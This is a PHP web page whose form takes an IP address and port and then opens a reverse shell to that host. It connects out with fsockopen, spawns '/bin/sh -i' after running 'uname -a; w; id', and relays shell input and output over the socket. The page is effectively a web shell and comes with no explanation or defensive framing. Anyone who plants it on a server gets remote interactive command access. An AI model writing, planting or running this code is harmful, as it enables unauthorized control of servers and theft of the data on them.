<!DOCTYPE html>
<html>
<head>
    <title>User Input in PHP</title>
</head>
<body>

<form method="post">
    <label for="ip">Enter IP address:</label>
    <input type="text" id="ip" name="ip" value="0.0.0.0"><br>
    <label for="port">Enter port:</label>
    <input type="text" id="port" name="port" value="6000"><br>
    <button type="submit">Submit</button>
</form>

<?php
// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Check if IP address and port fields are not empty
    if (!empty($_POST['ip']) && !empty($_POST['port'])) {
        $ip = $_POST['ip'];
        $port = $_POST['port'];
        // Rest of your code here
        set_time_limit(0);
        $VERSION = "1.0";
        $chunk_size = 1400;
        $write_a = null;
        $error_a = null;
        $shell = 'uname -a; w; id; /bin/sh -i';
        $daemon = 0;
        $debug = 0;

        // Open reverse connection
        $sock = fsockopen($ip, $port, $errno, $errstr, 30);
        if (!$sock) {
            printit("$errstr ($errno)");
            exit(1);
        }

        // Spawn shell process
        $descriptorspec = array(
           0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
           1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
           2 => array("pipe", "w")   // stderr is a pipe that the child will write to
        );

        $process = proc_open($shell, $descriptorspec, $pipes);

        if (!is_resource($process)) {
            printit("ERROR: Can't spawn shell");
            exit(1);
        }

        // Set everything to non-blocking
        // Reason: Occasionally reads will block, even though stream_select tells us they won't
        stream_set_blocking($pipes[0], 0);
        stream_set_blocking($pipes[1], 0);
        stream_set_blocking($pipes[2], 0);
        stream_set_blocking($sock, 0);

        printit("Successfully opened reverse shell to $ip:$port");

        while (1) {
            // Check for end of TCP connection
            if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
            }

            // Check for end of STDOUT
            if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
            }

            // Wait until a command is sent down $sock, or some
            // command output is available on STDOUT or STDERR
            $read_a = array($sock, $pipes[1], $pipes[2]);
            $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

            // If we can read from the TCP socket, send
            // data to the process's STDIN
            if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
            }

            // If we can read from the process's STDOUT
            // send data down tcp connection
            if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
            }

            // If we can read from the process's STDERR
            // send data down tcp connection
            if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
            }
        }

        fclose($sock);
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);

        // Like print, but does nothing if we've daemonized ourselves
        // (I can't figure out how to redirect STDOUT like a proper daemon)
        function printit($string)
        {
            if (!$daemon) {
                print "$string\n";
            }
        }
    } else {
        echo "<p>Please enter both IP address and port.</p>";
    }
}
?>

</body>
</html>
